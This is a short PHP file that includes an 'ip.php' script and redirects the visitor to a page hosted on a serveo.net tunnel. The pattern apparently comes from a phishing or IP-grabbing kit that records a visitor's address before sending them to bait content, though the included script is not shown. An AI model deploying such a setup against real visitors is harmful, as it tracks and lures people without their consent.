<?php
include 'ip.php';
header('Location: https://remajacantik.serveo.net/true.html');
exit
?>
